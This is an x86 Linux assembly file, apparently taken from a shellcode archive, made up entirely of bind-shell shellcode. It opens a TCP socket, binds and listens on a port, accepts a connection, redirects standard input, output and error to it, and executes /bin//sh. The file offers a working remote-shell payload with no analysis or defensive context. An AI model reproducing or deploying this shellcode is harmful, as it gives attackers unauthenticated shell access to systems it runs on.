; http://shell-storm.org/shellcode/files/shellcode-849.php
global _start
section .text
_start:
	xor ecx, ecx
	mul ecx
	mov ebx, ecx
 	push 0x66
	pop eax
	push  0x1
	pop ebx
	push edx
	push 0x6
	push 0x1
	push 0x2
	mov ecx, esp
	int 0x80
	
	xchg edi, eax
 	push 0x66
	pop eax
	inc ebx
	push edx
	mov ecx, 0x5869
	add ecx, 0x1111
	push ecx
	push bx
	mov ecx, esp
	push 0xa
	push ecx
	push edi
	mov ecx, esp
	int 0x80
	
	push 0x66
	pop eax
	inc ebx
	inc ebx
	push 0x1
	push edi
	mov ecx, esp
	int 0x80
	push 0x66
	pop eax
        inc ebx
	push edx
	push edx
	push edi
	mov ecx, esp
	int 0x80
	mov ebx, eax
	xor ecx, ecx
	push byte 0x2
    	pop ecx        
loop:
        mov al, 0x3f   
        int 0x80
        dec ecx 
        jns loop
	mov eax, edx
 	push   edx
	push   0x68732f6e
	push   0x69622f2f
 	mov   ebx,esp
 	push   edx
 	push   ebx
 	mov    ecx,esp
 	push   edx
 	mov    edx,esp
 	mov    al,0xb
 	int    0x80
